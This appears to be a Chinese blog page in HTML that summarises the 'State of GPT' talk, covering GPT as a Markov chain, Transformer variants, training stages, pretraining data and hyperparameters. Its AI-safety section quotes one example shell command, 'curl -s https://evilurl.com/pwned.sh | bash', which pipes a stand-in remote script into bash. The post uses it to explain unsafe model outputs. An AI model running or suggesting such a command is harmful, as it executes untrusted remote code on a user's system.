@@ -1,0 +1,536 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>GPT学习分享 | 盗计のBlog</title><meta name="author" content="Daoji,daoji.chang@gmail.com"><meta name="copyright" content="Daoji"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="GPT学习分享序学习Microsoft Build 2023的分享State of GPT。围绕三个内容讲解：  GPT模型 如何训练一个GPT助手 如何有效的将这些助手应用到业务上  有限状态马尔可夫链（FSMC） 本文展示了一个极简 GPT，它只有 2 个 token 0 和 1，上下文长度为 3； 这样的 GPT 可以看做是一个有限状态马尔可夫链（FSMC）。 我们将用 token sequ">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GPT学习分享">
+<meta property="og:url" content="https://www.yunjiguan.com/posts/60917.html">
+<meta property="og:site_name" content="盗计のBlog">
+<meta property="og:description" content="GPT学习分享序学习Microsoft Build 2023的分享State of GPT。围绕三个内容讲解：  GPT模型 如何训练一个GPT助手 如何有效的将这些助手应用到业务上  有限状态马尔可夫链（FSMC） 本文展示了一个极简 GPT，它只有 2 个 token 0 和 1，上下文长度为 3； 这样的 GPT 可以看做是一个有限状态马尔可夫链（FSMC）。 我们将用 token sequ">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://42f2671d685f51e10fc6-b9fcecea3e50b3b59bdc28dead054ebc.ssl.cf5.rackcdn.com/illustrations/High_five_u364.svg">
+<meta property="article:published_time" content="2024-03-07T03:14:02.000Z">
+<meta property="article:modified_time" content="2025-05-11T14:41:24.545Z">
+<meta property="article:author" content="Daoji">
+<meta property="article:tag" content="blog">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://42f2671d685f51e10fc6-b9fcecea3e50b3b59bdc28dead054ebc.ssl.cf5.rackcdn.com/illustrations/High_five_u364.svg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "GPT学习分享",
+  "url": "https://www.yunjiguan.com/posts/60917.html",
+  "image": "https://42f2671d685f51e10fc6-b9fcecea3e50b3b59bdc28dead054ebc.ssl.cf5.rackcdn.com/illustrations/High_five_u364.svg",
+  "datePublished": "2024-03-07T03:14:02.000Z",
+  "dateModified": "2025-05-11T14:41:24.545Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Daoji",
+      "url": "https://www.yunjiguan.com/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/assets/favicon.ico"><link rel="canonical" href="https://www.yunjiguan.com/posts/60917.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'GPT学习分享',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/daojiAnime/cdn/css/blog/background.css"><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="盗计のBlog" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load', preloader.endLoading)
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div id="web_bg" style="background-color: rgb(255, 255, 255);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src= "/img/loading.gif" data-lazy-src="https://i.imgur.com/6DEulXU.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">69</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">30</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 类别</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fas fa-video"></i><span> 相册</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener external nofollow noreferrer" href="https://daojianime.github.io/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://42f2671d685f51e10fc6-b9fcecea3e50b3b59bdc28dead054ebc.ssl.cf5.rackcdn.com/illustrations/High_five_u364.svg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">盗计のBlog</span></a><a class="nav-page-title" href="/"><span class="site-name">GPT学习分享</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 类别</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fas fa-video"></i><span> 相册</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener external nofollow noreferrer" href="https://daojianime.github.io/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">GPT学习分享</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-03-07T03:14:02.000Z" title="发表于 2024-03-07 11:14:02">2024-03-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-05-11T14:41:24.545Z" title="更新于 2025-05-11 22:41:24">2025-05-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%9C%AA%E5%88%86%E7%B1%BB/">未分类</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="GPT学习分享"><a href="#GPT学习分享" class="headerlink" title="GPT学习分享"></a>GPT学习分享</h1><h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>学习Microsoft Build 2023的分享<a target="_blank" rel="noopener external nofollow noreferrer" href="https://build.microsoft.com/en-US/sessions/db3f4859-cd30-4445-a0cd-553c3304f8e2">State of GPT</a>。围绕三个内容讲解：</p>
+<ol>
+<li>GPT模型</li>
+<li>如何训练一个GPT助手</li>
+<li>如何有效的将这些助手应用到业务上</li>
+</ol>
+<h2 id="有限状态马尔可夫链（FSMC）"><a href="#有限状态马尔可夫链（FSMC）" class="headerlink" title="有限状态马尔可夫链（FSMC）"></a>有限状态马尔可夫链（FSMC）</h2><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/states-2.png" alt="img"></p>
+<p>本文展示了一个极简 GPT，它只有 2 个 token <code>0</code> 和 <code>1</code>，上下文长度为 <code>3</code>； 这样的 GPT 可以看做是一个有限状态马尔可夫链（FSMC）。 我们将用 token sequence <code>111101111011110</code> 作为输入对这个极简 GPT 训练 50 次， 得到的状态转移概率符合我们的预期。</p>
+<h2 id="二进制GPT"><a href="#二进制GPT" class="headerlink" title="二进制GPT"></a>二进制GPT</h2><h3 id="token只有0和1"><a href="#token只有0和1" class="headerlink" title="token只有0和1"></a>token只有0和1</h3><ul>
+<li>输入：<code>0010101</code></li>
+<li>输出：下一个token是0的概率(P0)和1的概率(P1)</li>
+</ul>
+<p>例如输入的是：<code>010</code>，根据自身的参数和状态可能下一个token是1的概率为80%，即</p>
+<ul>
+<li>P(0) = 20%</li>
+<li>P(1) = 80%</li>
+</ul>
+<h3 id="状态-上下文-和上下文长度"><a href="#状态-上下文-和上下文长度" class="headerlink" title="状态(上下文)和上下文长度"></a>状态(上下文)和上下文长度</h3><p>上下文：相邻的三个token，用来预测下一个token，这三个token就是一个上下文，即GPT的<strong>状态</strong>。</p>
+<p>上下文长度：用来预测下一个token的token长度，如上文的<strong>3</strong>。</p>
+<h3 id="状态空间"><a href="#状态空间" class="headerlink" title="状态空间"></a>状态空间</h3><p>状态空间即所有可能出现的状态集合。</p>
+<ul>
+<li>**<code>vocab_size</code>**：token有多少可能的值。例如上文的0和1。</li>
+<li>**<code>context_length</code>**：上下文长度，例如上文的3。</li>
+</ul>
+<p>$$<br>total_states = vocab_sizee^{context_length}<br>$$</p>
+<p>则上午的二进制GPT总的状态数量就是 $2^{3} = 8$​。这也很好理解，所有状态枚举就能出来： {<code>000</code>, <code>001</code>, <code>010</code>, <code>011</code>, <code>100</code>, <code>101</code>, <code>110</code>, <code>111</code>}。</p>
+<h3 id="真实的状态空间"><a href="#真实的状态空间" class="headerlink" title="真实的状态空间"></a>真实的状态空间</h3><p>真实的GPT中输入也可是1个token和2个token，这里简化的二进制GPT像上面的有限状态马尔可夫链，容易理解。</p>
+<p>所以真实的状态空间为<br>$$<br>\sum_{i=1}^{content_length}{vocab_size}^{i}<br>$$<br>所有真实的状态一共有$2^{1}+2^{2}+2^{3}=14$种。为了方便理解，文中使用简化版的状态空间。</p>
+<h3 id="状态转移"><a href="#状态转移" class="headerlink" title="状态转移"></a>状态转移</h3><p>如序列<code>0101</code>，从状态<code>010</code>到状态<code>101</code>就是一次状态转移。</p>
+<h2 id="问题讨论"><a href="#问题讨论" class="headerlink" title="问题讨论"></a>问题讨论</h2><h3 id="词典大小和上下文长度"><a href="#词典大小和上下文长度" class="headerlink" title="词典大小和上下文长度"></a>词典大小和上下文长度</h3><p>本文讨论的是基于 3 个 token 的二进制 GPT。实际应用场景中，</p>
+<ul>
+<li><code>vocab_size</code> 会远远大于 2，例如 <strong><code>50k</code><strong>（</strong><code>GPT-2</code></strong> 的配置）；</li>
+<li><code>context_length</code> 的典型范围 **<code>2k~32k</code>**（GPT 2/3/4 的上下文长度分别为 **<code>2k/4k/32k</code>**）。</li>
+</ul>
+<h3 id="模型参数大小（GPT-2-3-4）"><a href="#模型参数大小（GPT-2-3-4）" class="headerlink" title="模型参数大小（GPT 2/3/4）"></a>模型参数大小（GPT 2/3/4）</h3><p>本文的例子是用 3bit 来存储一个状态，因此所需存储空间极小；但真实世界中的 GPT 模型所需的存储空间就大了。</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.lesswrong.com/posts/7qSHKYRnqyrumEfbt">这篇文章</a> 对比了 GPT 和常规计算机（computers）的 size，例如：</p>
+<ul>
+<li><p>GPT-2 有 <strong><code>50257</code></strong> 个独立 token，上下文长度是 <strong><code>2048</code></strong> 个 token。</p>
+<p>每个 token 需要 <code>log2(50257) ≈ 15.6bit</code> 来表示，那一个上下文或 <strong>一个状态</strong>需要的存储空间就是 **<code>15.6 bit/token * 2048 token = 31Kb ≈ 4KB</code>**。 </p>
+</li>
+<li><p>GPT-3 的上下文长度为 **<code>4096 tokens</code>**，因此需要 <strong><code>8KB</code></strong> 内存。</p>
+</li>
+<li><p>GPT-4 的上下文长度高达 <strong><code>32K tokens</code></strong> ，因此大约 <strong><code>64KB</code></strong> 才能存储一个状态。</p>
+</li>
+</ul>
+<h3 id="AI-安全"><a href="#AI-安全" class="headerlink" title="AI 安全"></a>AI 安全</h3><p>如果把 GPT 看做有限状态马尔可夫链，那 GPT 的安全需要考虑什么？ 答案是**将所有转移到不良状态的概率降低到 0， 例如以 token 序列 <code>[66, 6371, 532, 82, 3740, 1378, 23542, 6371, 13, 785, 14, 79, 675, 276, 13, 1477, 930, 27334]</code> 结尾的状态 —— 这个 token sequence 其实就是 **<code>curl -s https://evilurl.com/pwned.sh | bash</code>这一 shell 命令的编码，如果真实环境中用户执行了此类恶意命令将是非常危险的。</p>
+<p>更一般地来说，可以设想状态空间的某些部分是“红色”的，</p>
+<ul>
+<li>首先，我们永远不想转移到这些不良状态；</li>
+<li>其次，这些不良状态很多，无法一次性列举出来；</li>
+</ul>
+<p>因此，<strong>GPT 模型本身</strong>必须能够基于训练数据和 Transformer 的归纳偏差， <strong>自己就能知道这些状态是不良的</strong>，转移概率应该设置为 0%。 如果概率没有收敛到足够小（例如 <code>&lt; 1e-100</code>），那在足够大型的部署中 （例如<code>Temperature &gt; 0</code>，也没有用 <code>topp/topk</code> （采样超参数） 强制将低概率置为零） 可能就会命中这个概率，造成安全事故。</p>
+<h3 id="跟着代码学习构建一个babyGPT"><a href="#跟着代码学习构建一个babyGPT" class="headerlink" title="跟着代码学习构建一个babyGPT"></a>跟着代码学习构建一个babyGPT</h3><p>colab文章[^3]</p>
+<h2 id="原始的Transformer"><a href="#原始的Transformer" class="headerlink" title="原始的Transformer"></a>原始的Transformer</h2><p>当时的seq-to-seq（即文本序列转数字序列）模型的标准结构是Teacher forcing的<code>encoder-decoder</code>架构。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/encoder-decoder.png" alt="encoder - decoder"></p>
+<p><font>Encoder</font>获取整个<code>Input</code>序列转换成一个<strong>潜在表示序列</strong>，可以是一个数字序列，即运算中的向量。然后传递给<code>Decoder</code>，后者解码成目标序列。</p>
+<p>Transformer是一系列拥有<code>注意力机制(self-attention)</code>的架构，即能够和上下文有联系。Teacher forcing是指运许<code>decoder</code>访问<code>Input</code>的技术，也就是结合<code>Input</code>和<code>潜在表示序列</code>进行采样来生成目标序列，这样能够减少潜在表示序列的压力。理想情况下输入同样的<code>Input</code>能够生成两个语义相同的不同句子。</p>
+<h2 id="Transformer的进化"><a href="#Transformer的进化" class="headerlink" title="Transformer的进化"></a>Transformer的进化</h2><p>Transformer进化的路上主要有2种语言模型：</p>
+<ul>
+<li>自编码（auto-encoder）语言模型</li>
+<li>自回归（auto-regressive）语言模型</li>
+</ul>
+<h3 id="auto-encoder的优缺点"><a href="#auto-encoder的优缺点" class="headerlink" title="auto-encoder的优缺点"></a>auto-encoder的优缺点</h3><ul>
+<li>优点：自然地融入双向语言模型，同时看到被预测单词的上文和下文</li>
+<li>缺点：训练和预测不一致。训练的时候输入引入了[Mask]标记，但是在预测阶段往往没有这个[Mask]标记，导致预训练阶段和Fine-tuning阶段不一致。</li>
+</ul>
+<h3 id="auto-regressive的优缺点"><a href="#auto-regressive的优缺点" class="headerlink" title="auto-regressive的优缺点"></a>auto-regressive的优缺点</h3><ul>
+<li>优点：对于生成类的NLP任务，比如文本摘要，机器翻译等，从左向右的生成内容，天然和自回归语言模型契合。</li>
+<li>缺点：由于一般是从左到右（当然也可能从右到左），所以只能利用上文或者下文的信息，不能同时利用上文和下文的信息。</li>
+</ul>
+<h3 id="变化"><a href="#变化" class="headerlink" title="变化"></a>变化</h3><p>原始的Transformer模型很适合<font>机器翻译</font>，因为机器翻译正是一个文本序列转换成另一个文本序列（seq-to-seq）的过程。</p>
+<p>在解决一些实际任务的时候，并不需要完整的<code>encoder</code>和<code>decoder</code>结构，经过使用单一结构和堆的尽可能高的层数，然后使用大量语料训练，出现了两个突出的模型，即<code>BERT</code>和<code>GPT-2</code>。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/4-transformer.webp" alt="transformer"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/4-gpt-bert.webp" alt="gpt-bert"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/4-gpt-his2.webp" alt="gpt区分"></p>
+<p>BERT和GPT训练都使用了<strong>Masked Self-Attention</strong>的方式。BERT在训练中通过对随机单词进行Mask，然后推测Mask的单词；GPT则是通过屏蔽下文的单词进行训练，通过输入的序列预测下一个可能出现的单词。在训练数据上两者也有区别，BERT在大量的英文数据和维基百科中进行训练，语料多但是没有经过筛选，GPT则是寻找在Reddit社交媒体、维基百科和英文书籍上的优质文章进行训练。</p>
+<p>参数量：</p>
+<ul>
+<li>BERT：340M</li>
+<li>GPT-2：1.5B</li>
+</ul>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/4-mask.png" alt="mask attention"></p>
+<h2 id="训练AI助手引言"><a href="#训练AI助手引言" class="headerlink" title="训练AI助手引言"></a>训练AI助手引言</h2><p>训练大模型助手主要分成四个阶段：</p>
+<ol>
+<li><strong>预训练</strong>（pre-training）</li>
+<li><strong>监督微调</strong>（supervised fine tuning, SFT）</li>
+<li><strong>奖励建模</strong>（reward modeling）</li>
+<li><strong>强化学习</strong>（reinforcement learning）</li>
+</ol>
+<p>每个阶段又分成三个部分，<strong>数据集</strong>、<strong>算法训练</strong>、<strong>模型输出</strong>。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/training-pipeline.png" alt="img"></p>
+<h2 id="预训练"><a href="#预训练" class="headerlink" title="预训练"></a>预训练</h2><p>这个阶段占据了绝大多数的时间和算力，占据比例超过90%，</p>
+<h3 id="数据集"><a href="#数据集" class="headerlink" title="数据集"></a>数据集</h3><p>首先需要收集大量的数据。例如，下面是 Meta <a target="_blank" rel="noopener external nofollow noreferrer" href="https://arthurchiao.art/blog/llama-paper-zh/">训练 LLaMA 所用的数据集</a>，</p>
+<table>
+<thead>
+<tr>
+<th>占比</th>
+<th>数据集</th>
+<th>迭代次数（Epochs）</th>
+<th>数据集大小（Disk size）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>67.0%</td>
+<td>CommonCrawl</td>
+<td>1.10</td>
+<td>3.3 TB</td>
+</tr>
+<tr>
+<td>15.0%</td>
+<td>C4</td>
+<td>1.06</td>
+<td>783 GB</td>
+</tr>
+<tr>
+<td>4.5%</td>
+<td>Github</td>
+<td>0.64</td>
+<td>328 GB</td>
+</tr>
+<tr>
+<td>4.5%</td>
+<td>Wikipedia</td>
+<td>2.45</td>
+<td>83 GB</td>
+</tr>
+<tr>
+<td>4.5%</td>
+<td>Books</td>
+<td>2.23</td>
+<td>85 GB</td>
+</tr>
+<tr>
+<td>2.5%</td>
+<td>ArXiv</td>
+<td>1.06</td>
+<td>92 GB</td>
+</tr>
+<tr>
+<td>2.0%</td>
+<td>StackExchange</td>
+<td>1.03</td>
+<td>78 GB</td>
+</tr>
+</tbody></table>
+<p>表 1：LLaMA 预训练数据。<br>其中 epochs 是用 1.4T tokens 预训练时的迭代次数。用 1T tokens 预训练时也是用的这个数据集比例。</p>
+<p>可以大致看到这些数据集的类型。它们混合在一起，然后根据比例进行采样，得到 GPT 神经网络的训练集。</p>
+<h3 id="文本token化"><a href="#文本token化" class="headerlink" title="文本token化"></a>文本token化</h3><p>在实际训练这些数据之前，需要经过一个<strong>预处理步骤</strong>，即 <strong>token 化</strong>。</p>
+<ul>
+<li>将<strong>原始文本</strong>翻译成<strong>整数序列</strong>，后者是 GPT 的表示方式。<ul>
+<li>一个 token 可能是一个单词、一个词根、标点、标点+单词等等；</li>
+<li><strong>每个 token 平均对应 0.75 个单词</strong>；</li>
+<li>所有的独立 token 组成一个词典（词汇表），典型的词典大小：<strong>10k~100k tokens</strong>；</li>
+</ul>
+</li>
+<li>这种<strong>文本/token 转换是无损的</strong>，有很多算法，例如常用的字节对编码。</li>
+</ul>
+<p>将数据集的文本进行编码、序列化，得到矢量数据，这样能够更好将自然语言在数学上映射出关联的紧密程度。每个token是语句可拆分的最小单位，例如一个单词、一个符号。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/tokenizer.png" alt="img"></p>
+<h3 id="超参数"><a href="#超参数" class="headerlink" title="超参数"></a>超参数</h3><p>接下来需要考虑控制阶段的超参数。这里拿两个具体模型 GPT-3/LLaMA 作为例子，</p>
+<ul>
+<li>GPT-4 的训练信息公开比较少，所以这里使用 GPT-3 的数据，注意 GPT-3 已经是三年前的模型了。</li>
+<li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://arthurchiao.art/blog/llama-paper-zh/">LLaMA</a> 是 Meta 最近发布的一个开源模型，数据比较新，信息比较全。</li>
+</ul>
+<p>在GPT-3和LLaMA中主要关注<strong>词汇表大小</strong>、<strong>上下文长度</strong>、<strong>参数数量</strong>。</p>
+<p><font><strong>词汇表大小</strong></font>通常为10k个token。</p>
+<p><font><strong>上下文长度</strong></font>通常为2k/4k，有时甚至100k，这决定了模型在预测阶段中，预测序列下一个token所能看到的最大token数量。</p>
+<p><font><strong>参数数量</strong></font>一定程度上决定模型的性能，但不是绝对的。例如LLaMA在1.4万亿个token上训练，训练时间更长，相较在0.3万亿个token训练的GPT-3表现效果更好，但是LLaMA的最大参数是65B，比GPT-3的175B少了<strong>将近2/3</strong>。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/gpt3-vs-llama.png" alt="GPT-3 vs. LLaMA 超参数对比"></p>
+<h3 id="硬件环境和成本"><a href="#硬件环境和成本" class="headerlink" title="硬件环境和成本"></a>硬件环境和成本</h3><table>
+<thead>
+<tr>
+<th align="left"></th>
+<th align="left">GPU</th>
+<th align="left">训练时长</th>
+<th align="left">训练成本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">GPT-3</td>
+<td align="left">约**<code>一万张 V100</code>**</td>
+<td align="left">30 天左右</td>
+<td align="left">$100 万 ~ $1000 万</td>
+</tr>
+<tr>
+<td align="left">LLaMA</td>
+<td align="left"><strong><code>两千张 A100</code></strong></td>
+<td align="left">21 天</td>
+<td align="left">$500 万</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>V100/A100 <a target="_blank" rel="noopener external nofollow noreferrer" href="https://arthurchiao.art/blog/gpu-prices/">算力对比参考</a>。</p>
+</blockquote>
+<p>这些都是在预训练阶段应该考虑的。</p>
+<h3 id="训练过程"><a href="#训练过程" class="headerlink" title="训练过程"></a>训练过程</h3><p>输入给Transformer的是<code>(B, T)</code>的矩阵，<code>B</code>表示批次大小，<code>T</code>表示上下文长度。每个上下文中序列（即连续完成的单句）末尾要添加标识符，上下文的开头和末尾则不需要添加。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/hyperparams.png" alt="img"></p>
+<h3 id="预测下一个token"><a href="#预测下一个token" class="headerlink" title="预测下一个token"></a>预测下一个token</h3><p>预测下一个token只能使用<strong>当前行</strong>的<strong>前T个token</strong>进行预测。下一个token有<font>词汇表数量N</font>种可能性。概率根据输入服从某种分布。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://arthurchiao.art/assets/img/how-to-train-a-gpt-assistant/hyperparams-2.png" alt="img"></p>
+<p>现在看个更真实的训练，《纽约时报》团队在莎士比亚数据集上训练了一个小型 GPT。 下面是一小段莎士比亚文本和训练之后的采样效果：</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/training-process.png" alt="img"></p>
+<p>采样的方式是预测下一个 token，可以看到：</p>
+<ul>
+<li>左下角：开始时，GPT 的权重是完全随机的，因此也会得到完全随机的采样输出。</li>
+<li>右边：随着 GPT 训练时间越来越长，会得到越来越一致和连贯的采样输出。</li>
+</ul>
+<h3 id="损失函数"><a href="#损失函数" class="headerlink" title="损失函数"></a>损失函数</h3><p>控制训练的精度和梯度，即训练的效果和速度。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/training-curves.png" alt="img"></p>
